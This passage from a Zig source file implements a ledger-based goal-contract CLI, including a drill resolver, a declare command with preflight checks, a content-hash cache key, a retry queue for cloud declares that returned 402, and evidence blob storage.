            // rows that can never progress from the substrate side.
            if (std.mem.eql(u8, pointer.inferPointerType(decl_opt.?.action), "agent-judges")) continue;
            // Skip OTHER drill rows — they're standing resolvers, not work
            // items. Recursing into a drill from within a drill would create
            // unbounded mutual recursion (drill → backfill → resolveOne →
            // runAction → drill → ...). Standing drills fire on their own
            // pacemaker tick, not as a target of another drill.
            if (std.mem.startsWith(u8, r.action, "drill:")) continue;
            try candidates.append(allocator, r.id);
            if (candidates.items.len >= budget) break;
        }
        if (candidates.items.len == 0) {
            evidencePrint("drill: ledger settled after {d} pass(es); resolved {d} total\n", .{ pass, total_resolved });
            return;
        }
        evidencePrint("drill pass {d}: {d} unresolved row(s) within deep budget {d}\n", .{ pass + 1, candidates.items.len, budget });
        // Phase 1 energy router: order the frontier best-first (reorder-only,
        // non-breaking — always on, it IS the Way; no env toggle).
        energyRankCandidates(allocator, rows, candidates.items);
        const terminals_before = countTerminalEvents(rows);
        var progressed: u32 = 0;
        for (candidates.items) |cid| {
            const rc = resolveOne(allocator, env, cid) catch continue;
            if (rc == 0) progressed += 1;
        }
        total_resolved += progressed;
        // Progress includes a terminal verdict landing on ANY row — a death by
        // inherent-impossibility (command_not_found / inert_pointer /
        // unsigned_parent / stage_dead / child_dead) counts even when nothing
        // satisfied, because the next pass sees those rows filtered out of the
        // candidates and any parents can now apoptose via child_dead
        // inheritance. HOLDs alone do not count (the frontier must converge).
        const rows_after = try parseRows(allocator, env);
        defer allocator.free(rows_after);
        const terminals_landed = countTerminalEvents(rows_after) > terminals_before;
        if (progressed == 0 and !terminals_landed) {
            evidencePrint("drill: no progress on pass {d} — frontier stuck (resolved {d} total before stall)\n", .{ pass + 1, total_resolved });
            return;
        }
    }
    evidencePrint("drill: deep passes exhausted at {d} (resolved {d} total)\n", .{ max_passes, total_resolved });
}

/// Post-register briefing — declaring a goal and receiving its context are
/// one atomic act. Everything prints to stderr so stdout stays the bare
/// contract id for scripts. Compact by law: the proven route (if the router
/// knows one) plus up to three open root contracts in this store, nothing
/// more. Failures are silent — a briefing must never break a registration.
fn printBriefing(allocator: std.mem.Allocator, env: std.process.Environ, cid: []const u8, plan: []const u8) void {
    if (contract.recommend(allocator, env, plan) catch null) |json| {
        defer allocator.free(json);
        errPrint("proven: {s}\n", .{json});
    }
    const rows = parseRows(allocator, env) catch return;
    defer allocator.free(rows);
    var shown: usize = 0;
    var i = rows.len;
    while (i > 0 and shown < 3) {
        i -= 1;
        const r = rows[i];
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        if (r.parent_id != null) continue;
        if (std.mem.eql(u8, r.id, cid)) continue;
        if (isSatisfied(rows, r.id) or isDead(rows, r.id)) continue;
        // Substrate heartbeats aren't "open work" a caller could collide
        // with — only user-shaped goals earn a briefing line.
        if (std.mem.startsWith(u8, r.plan, "sabbath") or
            std.mem.startsWith(u8, r.plan, "turn:") or
            std.mem.startsWith(u8, r.plan, "tool:") or
            std.mem.startsWith(u8, r.plan, "word:") or
            std.mem.startsWith(u8, r.plan, "warm the semantic cache")) continue;
        errPrint("open: {s} — \"{s}\"\n", .{ r.id, displayField(allocator, env, r.id, r.event, r.plan) });
        shown += 1;
    }
}

fn cmdDeclare(allocator: std.mem.Allocator, env: std.process.Environ, args: []const []const u8) !u8 {
    const d = parseDeclare(args) catch |e| {
        errPrint("declare argument error: {s}\n", .{@errorName(e)});
        return 2;
    };
    // Drills B + C — preflight: wallet permission and binary self-attest.
    // Both fail-closed only when their strict env flag is set; otherwise emit
    // a WARN evidence line so the caller sees the gap without breaking flow.
    if (walletPermissionReject(allocator, env)) |cause| {
        errPrint("declare refused: {s}\n", .{cause});
        return 2;
    }
    if (binaryAttestReject(allocator, env)) |cause| {
        errPrint("declare refused: {s}\n", .{cause});
        return 2;
    }
    // purge:bio-kit-ceremony (84baa523) — pre-flight ceremony emissions
    // deleted. interoception / modulator / environment / bind-manifest /
    // pretool-ts evidence rows were decoration, not truth. Truth is in
    // the ledger's cache_check + signed rows. Keep only the actual gate
    // (homeostat) and the one-time wallet-bootstrap guidance.
    {
        const rows_pre = try parseRows(allocator, env);
        defer allocator.free(rows_pre);
        if (bioHomeostatReject(allocator, env, rows_pre)) |cause| {
            errPrint("declare refused: {s}\n", .{cause});
            return 2;
        }
        bioFirstRunWalletGuidance(allocator, env);
    }
    // Honor an explicit --action (e.g. "git commit" — names the binary for the EBM
    // router); fall back to inferring the action type from the plan when omitted.
    const action = d.action orelse actionFromPlan(d.plan);
    if (AIKO_DECLARE_ONLY) {
        const safe_plan = redactAikoPlan(allocator, d.plan) catch |e| {
            errPrint("aiko privacy guard failed: {s}\n", .{@errorName(e)});
            return 2;
        };
        defer allocator.free(safe_plan);
        const body = client.declareRemoteAiko(allocator, env, safe_plan, action, null, null, null, null, null, null, null) catch |e| {
            errPrint("aiko declare failed against Unbrowse: {s}\n", .{@errorName(e)});
            return 2;
        };
        defer allocator.free(body);
        const id = jsonString(body, "id") orelse {
            err("remote declare response missing id\n");
            return 2;
        };
        outPrint("{s}\n", .{id});
        return 0;
    }
    if (client.isRemoteMode(env)) {
        const body = client.declareRemote(allocator, env, d.plan, action, null, null, null, null, null, null, null) catch |e| {
            errPrint("remote declare failed: {s}\n", .{@errorName(e)});
            return 2;
        };
        defer allocator.free(body);
        const id = jsonString(body, "id") orelse {
            err("remote declare response missing id\n");
            return 2;
        };
        outPrint("{s}\n", .{id});
        return 0;
    }
    const cid = try contract.declare(allocator, env, d.plan, action, .{ .parent_id = null });
    defer allocator.free(cid);
    outPrint("{s}\n", .{cid});
    // Bookkeeping-only registration must never enter the resolver. Skills use
    // this path to durably record a goal while the calling LLM performs the
    // work and verification itself. Registration answers with the briefing:
    // the proven route for goals shaped like this plus what's already open,
    // so the caller starts oriented without a second command.
    if (d.register) {
        printBriefing(allocator, env, cid, d.plan);
        return 0;
    }
    // One mutation path: declaration always enters the same resolver tick.
    // --fast/--resolve remain accepted for compatibility; --resolve still
    // materializes its historical word children.
    if (d.resolve) {
        // Every word in the plan is itself a /contract — fan out one
        // `word:<tok>` child per unique token, lineage-signed under cid.
        // Failures here must not invalidate the parent declared row.
        if (contract.words.emitWordChildren(allocator, env, cid, d.plan)) |stats| {
            evidencePrint(
                "words: emitted={d} skipped={d} failed={d}\n",
                .{ stats.emitted, stats.skipped, stats.failed },
            );
        } else |e| {
            evidencePrint("words skipped: {s}\n", .{@errorName(e)});
        }
        // Materialize binary if CONTRACT_BINARY_TARGET is declared.
        bioMaterializeBinary(allocator, env, cid) catch |e| {
            evidencePrint("materialize skipped: {s}\n", .{@errorName(e)});
        };
    }
    try resolverTick(allocator, env);
    return 0;
}

/// cmdSpeak — the single Word.
///
/// The binary invocation IS the verb. Speaking a truth claim deterministically
/// walks seven phases (Genesis 1–2: God speaks → the Word becomes flesh → the
/// substrate rests). No phase is optional; no caller chooses a phase. Each
/// phase is idempotent against the append-only ledger.
///
///   Day 1  Word      — `declared` row appended (the speech is the act).
///   Day 2  Firmament — `child_added` per parent_id (containment edge).
///   Day 3  Earth     — synapse dispatch by kind (cross-dimension edges).
///   Day 4  Lights    — gate on `blocked_by` / `inhibits` / external metrics.
///   Day 5  Life      — corroborate child evidence per `aggregation`.
///   Day 6  Image     — `satisfied` row appended iff Days 4-5 ratified.
///   Day 7  Sabbath   — `called` rows per `posthook:` synapse — the word
///                      propagates and the wavefront seals.
///
/// Walk the raw (pre-scrub) plan for path-like tokens. For each token that
/// resolves to a readable regular file under the current working directory,
/// fold (path-relative-to-cwd, sha256(content)) into a rolling sha256.
/// Returns the hex digest as an owned slice, or null if no file refs found.
///
/// This is the v2 cache key's "content layer" (Docker-style): when one of
/// the referenced files changes byte-for-byte, the rolling sha256 flips, the
/// inputs_hash flips, and the cache invalidates → next declare with the same
/// plan in the same cwd against different file content gets a fresh id.
///
/// Privacy: only the digest survives in the row; the path strings get
/// scrubbed by `redactAikoPlan` before this function's result is even
/// referenced. The digest itself is collision-resistant sha256 — it does
/// NOT leak filenames or file content.
///
/// Heuristic (no regex in stdlib): split raw plan on ASCII whitespace +
/// quote chars, then for each token check:
///   - contains '/' (path-shaped) OR starts with './' or '../'
///   - resolves (relative to cwd) to a regular file
///   - file size ≤ 4 MiB (the cap on what we'll hash; oversized files
///     still contribute their path + size, not full content)
/// Anything that doesn't resolve is silently skipped — caller may
/// reference files that don't exist yet (declared truth claim about
/// future state).
fn extractFileRefsAndHash(
    allocator: std.mem.Allocator,
    raw_plan: []const u8,
) !?[]u8 {
    var cwd_buf: [4096]u8 = undefined;
    const cwd_ptr = std.c.getcwd(&cwd_buf, cwd_buf.len);
    if (cwd_ptr == null) return null;
    const cwd: []const u8 = std.mem.span(@as([*:0]const u8, @ptrCast(cwd_ptr.?)));

    var hasher = std.crypto.hash.sha2.Sha256.init(.{});
    var any_found: bool = false;

    // Tokenize on whitespace + common quote chars; ignore the leading
    // backtick/punctuation so `src/foo.ts` and "src/foo.ts" both yield
    // src/foo.ts.
    const delims = " \t\n\r\"'`(),;<>";
    var iter = std.mem.tokenizeAny(u8, raw_plan, delims);
    while (iter.next()) |raw_tok| {
        // Strip trailing punctuation like ':', '.', etc. (one pass — keep
        // dots inside the token: src/foo.ts must survive).
        var tok = raw_tok;
        while (tok.len > 0 and (tok[tok.len - 1] == ':' or tok[tok.len - 1] == ',' or
            tok[tok.len - 1] == '.' or tok[tok.len - 1] == ';' or tok[tok.len - 1] == ')'))
        {
            tok = tok[0 .. tok.len - 1];
        }
        if (tok.len < 2) continue;
        // Heuristic: must contain '/' (path shape).
        if (std.mem.indexOfScalar(u8, tok, '/') == null) continue;
        // Reject obvious URLs (cache key shouldn't depend on URLs because
        // they're network state, not source state).
        if (std.mem.indexOf(u8, tok, "://") != null) continue;

        // Resolve to absolute path.
        var path_buf: [8192]u8 = undefined;
        const abs_path: []const u8 = blk: {
            if (tok[0] == '/') {
                if (tok.len >= path_buf.len) continue;
                break :blk tok;
            }
            // Relative — join under cwd.
            const joined = std.fmt.bufPrint(&path_buf, "{s}/{s}", .{ cwd, tok }) catch continue;
            break :blk joined;
        };

        // Open + check it's a regular file (skip directories).
        const path_z = allocator.dupeZ(u8, abs_path) catch continue;
        defer allocator.free(path_z);
        const fd = std.c.open(path_z.ptr, .{ .ACCMODE = .RDONLY }, @as(c_uint, 0));
        if (fd < 0) continue;
        defer _ = std.c.close(fd);

        // Hash up to 4 MiB of content.
        const cap: usize = 4 * 1024 * 1024;
        var chunk: [8192]u8 = undefined;
        var total: usize = 0;
        var file_hasher = std.crypto.hash.sha2.Sha256.init(.{});
        while (total < cap) {
            const want = if (cap - total < chunk.len) cap - total else chunk.len;
            const n = std.c.read(fd, &chunk, want);
            if (n <= 0) break;
            const got: usize = @intCast(n);
            file_hasher.update(chunk[0..got]);
            total += got;
        }
        var file_digest: [32]u8 = undefined;
        file_hasher.final(&file_digest);

        // Fold (token-as-cited, file-content-digest) into the outer hash.
        // Use the token-as-cited (not the resolved abs path) so two callers
        // in the same cwd citing the same relative path collide cleanly.
        hasher.update(tok);
        hasher.update("=");
        hasher.update(&file_digest);
        hasher.update("\n");
        any_found = true;
    }

    if (!any_found) return null;

    var outer_digest: [32]u8 = undefined;
    hasher.final(&outer_digest);
    const hex_chars = "0123456789abcdef";
    var hex_buf: [64]u8 = undefined;
    for (outer_digest, 0..) |b, i| {
        hex_buf[i * 2] = hex_chars[b >> 4];
        hex_buf[i * 2 + 1] = hex_chars[b & 0x0F];
    }
    return try allocator.dupe(u8, &hex_buf);
}

// ─── Pending-declare retry queue (Wave-1 replacement for llm_fallback) ───
//
// When a SHARED declare hits the cloud and the response is 402 (wallet
// empty), the prior path compiled the goal locally with a weak Qwen
// 0.8B and wrote canonical rows to the on-disk ledger as if the cloud
// had answered. That was leaven: the cloud's authoritative graph and
// this host's view permanently disagreed. The replacement is a
// hard-fail-closed queue:
//
//   1. queuePendingDeclare writes the to-be-declared payload to
//      ~/.contracts/pending-declares/<sha-prefix>.json with an
//      attempt_count.
//   2. retryQueuedDeclares is called at the top of main, BEFORE any
//      other dispatch, on every aiko invocation. Each queued payload
//      is re-POSTed to the cloud; on 2xx the file is deleted, on 402
//      the attempt_count increments, and after 10 attempts the file
//      is moved under pending-declares/abandoned/.
//   3. The original invocation that 402'd exits with status 2 + an
//      evidence line naming the queued sha-prefix, so the caller sees
//      the deferral honestly.
//
// --private declares do NOT pass through this queue: by doctrine
// (Lewis 2026-05-26) they are fully local and must never cross the
// wire. The queue is for shared (default) declares only.

/// Resolve `~/.contracts/pending-declares` (and optionally a sub-dir).
/// Caller frees. Returns error.NoHome when $HOME is unset.
fn resolvePendingDir(
    allocator: std.mem.Allocator,
    env: std.process.Environ,
    sub: ?[]const u8,
) ![]u8 {
    const home = env.getPosix("HOME") orelse return error.NoHome;
    if (sub) |s| {
        return try std.fs.path.join(allocator, &.{ home, ".contracts", "pending-declares", s });
    }
    return try std.fs.path.join(allocator, &.{ home, ".contracts", "pending-declares" });
}

/// Best-effort `mkdir -p` for a 3-level path. Silent on already-exists;
/// `_ = std.c.mkdir` returns -1+EEXIST for existing dirs and we don't
/// care which level created it.
fn ensurePendingDirs(allocator: std.mem.Allocator, env: std.process.Environ) !void {
    const home = env.getPosix("HOME") orelse return error.NoHome;
    const a = try std.fs.path.join(allocator, &.{ home, ".contracts" });
    defer allocator.free(a);
    const b = try std.fs.path.join(allocator, &.{ home, ".contracts", "pending-declares" });
    defer allocator.free(b);
    const c = try std.fs.path.join(allocator, &.{ home, ".contracts", "pending-declares", "abandoned" });
    defer allocator.free(c);
    const az = try allocator.dupeZ(u8, a);
    defer allocator.free(az);
    const bz = try allocator.dupeZ(u8, b);
    defer allocator.free(bz);
    const cz = try allocator.dupeZ(u8, c);
    defer allocator.free(cz);
    _ = std.c.mkdir(az.ptr, 0o700);
    _ = std.c.mkdir(bz.ptr, 0o700);
    _ = std.c.mkdir(cz.ptr, 0o700);
}

/// Sha256(plan|ts|wallet_pubkey) → 16-hex prefix. The prefix is the queue
/// idempotency key: two invocations of the same goal with the same wallet
/// at the same instant collide cleanly into one queued payload.
fn pendingShaPrefix(plan: []const u8, ts: []const u8, wallet_pubkey: []const u8, out_hex: *[16]u8) []const u8 {
    var hasher = std.crypto.hash.sha2.Sha256.init(.{});
    hasher.update(plan);
    hasher.update("|");
    hasher.update(ts);
    hasher.update("|");
    hasher.update(wallet_pubkey);
    var digest: [32]u8 = undefined;
    hasher.final(&digest);
    const tab = "0123456789abcdef";
    var i: usize = 0;
    while (i < 8) : (i += 1) {
        out_hex[i * 2] = tab[digest[i] >> 4];
        out_hex[i * 2 + 1] = tab[digest[i] & 0x0f];
    }
    return out_hex[0..16];
}

/// Queue a shared declare that 402'd. Writes
/// ~/.contracts/pending-declares/<sha>.json with `{plan, action, ts,
/// wallet_pubkey, attempt_count: 0}`. Surfaces ONE evidence line on
/// success; silent on filesystem failure (the caller has bigger
/// problems). Never throws to the caller — losing the queued envelope
/// is strictly less bad than crashing the invocation that already
/// gracefully reported PaymentRequired.
fn queuePendingDeclare(
    allocator: std.mem.Allocator,
    env: std.process.Environ,
    plan: []const u8,
    action: []const u8,
    wallet_pubkey: []const u8,
) void {
    ensurePendingDirs(allocator, env) catch |e| {
        evidencePrint("pending-queue: mkdir failed: {s} — declare not queued\n", .{@errorName(e)});
        return;
    };

    var ts_buf: [64]u8 = undefined;
    const ts = contract.nowIsoUtc(&ts_buf) catch {
        evidencePrint("pending-queue: nowIsoUtc failed — declare not queued\n", .{});
        return;
    };

    var sha_buf: [16]u8 = undefined;
    const sha_hex = pendingShaPrefix(plan, ts, wallet_pubkey, &sha_buf);

    const fname = std.fmt.allocPrint(allocator, "{s}.json", .{sha_hex}) catch {
        evidencePrint("pending-queue: oom — declare not queued\n", .{});
        return;
    };
    defer allocator.free(fname);

    const path = resolvePendingDir(allocator, env, fname) catch {
        evidencePrint("pending-queue: path resolve failed — declare not queued\n", .{});
        return;
    };
    defer allocator.free(path);
    const path_z = allocator.dupeZ(u8, path) catch return;
    defer allocator.free(path_z);

    // Build the JSON body. `appendJsonEscaped` already handles the
    // load-bearing escapes (quotes, backslash, control chars).
    var buf: std.ArrayList(u8) = .empty;
    defer buf.deinit(allocator);
    buf.appendSlice(allocator, "{\"plan\":") catch return;
    appendJsonEscaped(allocator, &buf, plan) catch return;
    buf.appendSlice(allocator, ",\"action\":") catch return;
    appendJsonEscaped(allocator, &buf, action) catch return;
    buf.appendSlice(allocator, ",\"ts\":") catch return;
    appendJsonEscaped(allocator, &buf, ts) catch return;
    buf.appendSlice(allocator, ",\"wallet_pubkey\":") catch return;
    appendJsonEscaped(allocator, &buf, wallet_pubkey) catch return;
    buf.appendSlice(allocator, ",\"attempt_count\":0}\n") catch return;

    var wflags: std.c.O = .{};
    wflags.ACCMODE = .WRONLY;
    wflags.CREAT = true;
    wflags.TRUNC = true;
    const fd = std.c.open(path_z.ptr, wflags, @as(c_uint, 0o600));
    if (fd < 0) {
        evidencePrint("pending-queue: open {s} failed — declare not queued\n", .{path});
        return;
    }
    _ = std.c.write(fd, buf.items.ptr, buf.items.len);
    _ = std.c.close(fd);

    evidencePrint(
        "aiko: cloud declare returned 402; payload queued at pending-declares/{s} — will retry on next funded invocation\n",
        .{sha_hex},
    );
}

/// Try one queued payload: re-POST via `client.declareRemoteAiko`. On
/// 2xx → delete the file, surface success line, return true. On 402 →
/// increment `attempt_count` (or move to abandoned/ at 10). On other
/// error → leave the file unchanged (transport failure ≠ permanent
/// payment failure; let the next sweep try again).
fn retryOneQueuedDeclare(
    allocator: std.mem.Allocator,
    env: std.process.Environ,
    file_path: []const u8,
    file_name: []const u8,
) void {
    const path_z = allocator.dupeZ(u8, file_path) catch return;
    defer allocator.free(path_z);

    var st: c_stat = .{};
    if (stat(path_z.ptr, &st) != 0) return;
    if ((st.st_mode & 0o170000) != 0o100000) return; // not a regular file

    // Read the JSON. 16 KB is plenty — declare bodies are tens of
    // bytes; if a future payload grows beyond this we'll see it.
    const fd = std.c.open(path_z.ptr, .{ .ACCMODE = .RDONLY }, @as(c_uint, 0));
    if (fd < 0) return;
    var raw: std.ArrayList(u8) = .empty;
    defer raw.deinit(allocator);
    var chunk: [4096]u8 = undefined;
    while (true) {
        const n = std.c.read(fd, &chunk, chunk.len);
        if (n <= 0) break;
        const got: usize = @intCast(n);
        raw.appendSlice(allocator, chunk[0..got]) catch {
            _ = std.c.close(fd);
            return;
        };
        if (raw.items.len > 65536) break; // sanity cap
    }
    _ = std.c.close(fd);
    if (raw.items.len == 0) return;

    const parsed = std.json.parseFromSlice(std.json.Value, allocator, raw.items, .{}) catch return;
    defer parsed.deinit();
    if (parsed.value != .object) return;
    const obj = parsed.value.object;
    const plan_v = obj.get("plan") orelse return;
    if (plan_v != .string) return;
    const action_v = obj.get("action") orelse return;
    if (action_v != .string) return;
    const plan = plan_v.string;
    const action = action_v.string;
    const attempt_count: i64 = if (obj.get("attempt_count")) |a| (if (a == .integer) a.integer else 0) else 0;

    // Re-POST. The wallet binding is taken from the host's current
    // keystore (the queued JSON intentionally does not carry the
    // signed body — the signature would be stale anyway, and the
    // canonical body must be rebuilt at retry time).
    const body = client.declareRemoteAiko(allocator, env, plan, action, null, null, null, null, null, null, null) catch |e| {
        if (e == error.PaymentRequired) {
            // Still 402. Increment attempt_count; abandon at 10.
            const next_attempt = attempt_count + 1;
            if (next_attempt >= 10) {
                const abandoned_path = resolvePendingDir(allocator, env, file_name) catch return;
                defer allocator.free(abandoned_path);
                const abandoned_full = std.fs.path.join(allocator, &.{ abandoned_path[0 .. abandoned_path.len - file_name.len], "abandoned", file_name }) catch return;
                defer allocator.free(abandoned_full);
                const abandoned_z = allocator.dupeZ(u8, abandoned_full) catch return;
                defer allocator.free(abandoned_z);
                if (std.c.rename(path_z.ptr, abandoned_z.ptr) == 0) {
                    const sha_label = if (file_name.len > 5) file_name[0 .. file_name.len - 5] else file_name;
                    evidencePrint("aiko: pending declare {s} abandoned after 10 attempts\n", .{sha_label});
                }
                return;
            }
            // Rewrite with incremented attempt_count. Same JSON shape.
            var buf: std.ArrayList(u8) = .empty;
            defer buf.deinit(allocator);
            buf.appendSlice(allocator, "{\"plan\":") catch return;
            appendJsonEscaped(allocator, &buf, plan) catch return;
            buf.appendSlice(allocator, ",\"action\":") catch return;
            appendJsonEscaped(allocator, &buf, action) catch return;
            if (obj.get("ts")) |t| {
                if (t == .string) {
                    buf.appendSlice(allocator, ",\"ts\":") catch return;
                    appendJsonEscaped(allocator, &buf, t.string) catch return;
                }
            }
            if (obj.get("wallet_pubkey")) |w| {
                if (w == .string) {
                    buf.appendSlice(allocator, ",\"wallet_pubkey\":") catch return;
                    appendJsonEscaped(allocator, &buf, w.string) catch return;
                }
            }
            const tail = std.fmt.allocPrint(allocator, ",\"attempt_count\":{d}}}\n", .{next_attempt}) catch return;
            defer allocator.free(tail);
            buf.appendSlice(allocator, tail) catch return;
            var wflags: std.c.O = .{};
            wflags.ACCMODE = .WRONLY;
            wflags.CREAT = true;
            wflags.TRUNC = true;
            const wfd = std.c.open(path_z.ptr, wflags, @as(c_uint, 0o600));
            if (wfd < 0) return;
            _ = std.c.write(wfd, buf.items.ptr, buf.items.len);
            _ = std.c.close(wfd);
            return;
        }
        // Transport / other error: leave the file alone, next sweep retries.
        return;
    };
    defer allocator.free(body);

    // 2xx — success. Delete the queue file and surface the new id.
    if (jsonString(body, "id")) |new_id| {
        const sha_label = if (file_name.len > 5) file_name[0 .. file_name.len - 5] else file_name;
        evidencePrint("aiko: pending declare {s} retried successfully, row id {s}\n", .{ sha_label, new_id });
    }
    _ = std.c.unlink(path_z.ptr);
}

/// Sweep `~/.contracts/pending-declares/` once at the top of `main`.
/// Skips the `abandoned/` subdir. Never throws — a transport failure
/// or a missing dir is silently survived.
fn retryQueuedDeclares(allocator: std.mem.Allocator, env: std.process.Environ) void {
    const dir_path = resolvePendingDir(allocator, env, null) catch |e| {
        substrateEvidence("pending-queue: resolvePendingDir failed: {s} — sweep skipped\n", .{@errorName(e)});
        return;
    };
    defer allocator.free(dir_path);
    const dir_path_z = allocator.dupeZ(u8, dir_path) catch |e| {
        substrateEvidence("pending-queue: dupeZ dir_path failed: {s} — sweep skipped\n", .{@errorName(e)});
        return;
    };
    defer allocator.free(dir_path_z);

    // opendir + readdir via std.c. Keeps the same C-stdlib shape as the
    // rest of this file (no std.fs.openDir alloc churn).
    const dirp = std.c.opendir(dir_path_z.ptr) orelse return;
    defer _ = std.c.closedir(dirp);

    while (std.c.readdir(dirp)) |entry| {
        // Darwin's dirent uses `.name: [1024]u8` + `.namlen: u16`. Linux
        // uses `.name: [256]u8` (no namlen — name is NUL-terminated). The
        // shared shape is "name buffer, NUL-terminated"; use NUL-scan so
        // the code is portable across both. Skip the bounds check: every
        // libc readdir returns a NUL within the buffer.
        const name_buf_ptr: [*]const u8 = @ptrCast(&entry.name);
        const name_len = std.mem.indexOfScalar(u8, name_buf_ptr[0..entry.name.len], 0) orelse entry.name.len;
        const name = name_buf_ptr[0..name_len];
        if (name.len == 0) continue;
        if (name[0] == '.') continue; // skip ., .., dotfiles
        if (std.mem.eql(u8, name, "abandoned")) continue;
        // Only process *.json files.
        if (!std.mem.endsWith(u8, name, ".json")) continue;

        const full = std.fs.path.join(allocator, &.{ dir_path, name }) catch continue;
        defer allocator.free(full);
        retryOneQueuedDeclare(allocator, env, full, name);
    }
}

/// Days 1-3 always fire. Days 4-7 are conditional on truth holding. A held day
/// returns exit 1; the row stays pending until a future speech ratifies it.
fn sha256Hex(digest: [32]u8, dst: []u8) []const u8 {
    const tab = "0123456789abcdef";
    var i: usize = 0;
    while (i < 32) : (i += 1) {
        dst[i * 2 + 0] = tab[digest[i] >> 4];
        dst[i * 2 + 1] = tab[digest[i] & 0x0f];
    }
    return dst[0..64];
}

/// Project/global axis mirrors `ledger.resolvePath`.
fn resolveBlobsDir(allocator: std.mem.Allocator, env: std.process.Environ) ![]u8 {
    var cwd_buf: [4096]u8 = undefined;
    const cwd_ptr = std.c.getcwd(&cwd_buf, cwd_buf.len) orelse return error.GetCwdFailed;
    const cwd_len = std.mem.indexOfScalar(u8, &cwd_buf, 0) orelse cwd_buf.len;
    const cwd = cwd_buf[0..cwd_len];
    _ = cwd_ptr;
    const project_dir = try std.fs.path.join(allocator, &.{ cwd, ".claude" });
    defer allocator.free(project_dir);
    var st: c_stat = .{};
    const project_dir_z = try allocator.dupeZ(u8, project_dir);
    defer allocator.free(project_dir_z);
    if (stat(project_dir_z.ptr, &st) == 0 and ((st.st_mode & 0o170000) == 0o040000)) {
        return try std.fs.path.join(allocator, &.{ cwd, ".claude", "blobs" });
    }
    const home = env.getPosix("HOME") orelse return error.NoHome;
    return try std.fs.path.join(allocator, &.{ home, ".contracts", "blobs" });
}

/// Idempotent: same bytes hash to the same blob path; write skipped if
/// already present. Never throws — losing observation must not block goal
/// resolution.
fn flushStderrTapeAsEvidence(
    allocator: std.mem.Allocator,
    env: std.process.Environ,
    root_id: []const u8,
    scope: []const u8,
) void {
    if (!stderr_tape_armed) return;
    const buf = if (stderr_tape_buf) |*b| b else return;
    if (buf.items.len == 0) return;

    var digest: [32]u8 = undefined;
    std.crypto.hash.sha2.Sha256.hash(buf.items, &digest, .{});
    var hex_buf: [64]u8 = undefined;
    const hex = sha256Hex(digest, &hex_buf);

    const dir = resolveBlobsDir(allocator, env) catch |e| {
        evidencePrint("evidence: resolveBlobsDir failed: {s} — tape not persisted\n", .{@errorName(e)});
        return;
    };
    defer allocator.free(dir);
    const dir_z = allocator.dupeZ(u8, dir) catch |e| {
        substrateEvidence("evidence: dupeZ dir failed: {s} — tape not persisted\n", .{@errorName(e)});
        return;
    };
    defer allocator.free(dir_z);
    _ = std.c.mkdir(dir_z.ptr, 0o755);

    const blob_path = std.fs.path.join(allocator, &.{ dir, hex }) catch |e| {
        substrateEvidence("evidence: path.join blob failed: {s} — tape not persisted\n", .{@errorName(e)});
        return;
    };
    defer allocator.free(blob_path);
    const blob_path_z = allocator.dupeZ(u8, blob_path) catch |e| {
        substrateEvidence("evidence: dupeZ blob_path failed: {s} — tape not persisted\n", .{@errorName(e)});
        return;
    };
    defer allocator.free(blob_path_z);

    var bst: c_stat = .{};
    const already_present = stat(blob_path_z.ptr, &bst) == 0;
    if (!already_present) {
        var wflags: std.c.O = .{};
        wflags.ACCMODE = .WRONLY;
        wflags.CREAT = true;
        wflags.TRUNC = true;
        const fd = std.c.open(blob_path_z.ptr, wflags, @as(c_uint, 0o600));
        if (fd < 0) {
            evidencePrint("evidence: open blob failed for {s} — tape not persisted\n", .{hex});
            return;
        }
        _ = std.c.write(fd, buf.items.ptr, buf.items.len);
        _ = std.c.close(fd);
    }

    // Privacy axis lives ON the pointer prefix, not just on a row field.
    // `sha256-private:` blobs must never leave this host; `sha256-shared:`
    // are caller-redacted and may be cloud-mirrored.
    var ptr_buf: [96]u8 = undefined;
    const prefix: []const u8 = if (std.mem.eql(u8, scope, "shared")) "sha256-shared" else "sha256-private";
    const pointer_str = std.fmt.bufPrint(&ptr_buf, "{s}:{s}", .{ prefix, hex }) catch |e| {
        substrateEvidence("evidence: bufPrint sha256 pointer failed: {s} — row not appended\n", .{@errorName(e)});
        return;
    };
    contract.appendEvidenceRow(allocator, env, root_id, pointer_str, scope, buf.items.len) catch |e| {
        evidencePrint("evidence: appendEvidenceRow failed: {s} — blob persisted at {s}\n", .{ @errorName(e), blob_path });
        return;
    };
    // Disarm so any later writes don't accumulate into a stale buffer.
    stderr_tape_armed = false;
}

/// Parsed eval-verb goal (four-verb table: `satisfied:<id> wave=<n> — <proof>`).
const SatisfiedGoal = struct {
    id: []const u8,
    wave: u32,
    proof: []const u8,
};

/// Recognize the eval grammar in a goal: leading token `satisfied:<8hex>`,
/// optional `wave=<n>`, proof = text after the first "— " (or " - ").
/// Returns null when the goal is not eval-shaped — it then declares as a
/// plain neuron like any other truth claim.
fn parseSatisfiedGoal(plan: []const u8) ?SatisfiedGoal {
    const prefix = "satisfied:";
    if (!std.mem.startsWith(u8, plan, prefix)) return null;
    if (plan.len < prefix.len + 8) return null;
    const id = plan[prefix.len .. prefix.len + 8];
    for (id) |c| {
        const ok = (c >= '0' and c <= '9') or (c >= 'a' and c <= 'f');
        if (!ok) return null;
    }
    var wave: u32 = 1;
    if (std.mem.indexOf(u8, plan, "wave=")) |wi| {
        const rest = plan[wi + 5 ..];
        var end: usize = 0;
        while (end < rest.len and rest[end] >= '0' and rest[end] <= '9') end += 1;
        if (end > 0) wave = std.fmt.parseInt(u32, rest[0..end], 10) catch 1;
    }
    var proof: []const u8 = "";
    if (std.mem.indexOf(u8, plan, "\u{2014} ")) |pi| {
        proof = plan[pi + "\u{2014} ".len ..];
    } else if (std.mem.indexOf(u8, plan, " - ")) |pi| {
        proof = plan[pi + 3 ..];
    }
    return .{ .id = id, .wave = wave, .proof = proof };
}

/// Parsed run-verb goal (four-verb table: `iterate:<id> — <what this wave exercises>`).
const IterateGoal = struct {
    id: []const u8,
    wave: u32,
    result: []const u8,
};

fn parseIterateGoal(plan: []const u8) ?IterateGoal {
    const prefix = "iterate:";
    if (!std.mem.startsWith(u8, plan, prefix)) return null;
    if (plan.len < prefix.len + 8) return null;
    const id = plan[prefix.len .. prefix.len + 8];
    for (id) |c| {
        const ok = (c >= '0' and c <= '9') or (c >= 'a' and c <= 'f');
        if (!ok) return null;
    }
    var wave: u32 = 1;
    if (std.mem.indexOf(u8, plan, "wave=")) |wi| {
        const rest = plan[wi + 5 ..];
        var end: usize = 0;
        while (end < rest.len and rest[end] >= '0' and rest[end] <= '9') end += 1;
        if (end > 0) wave = std.fmt.parseInt(u32, rest[0..end], 10) catch 1;
    }
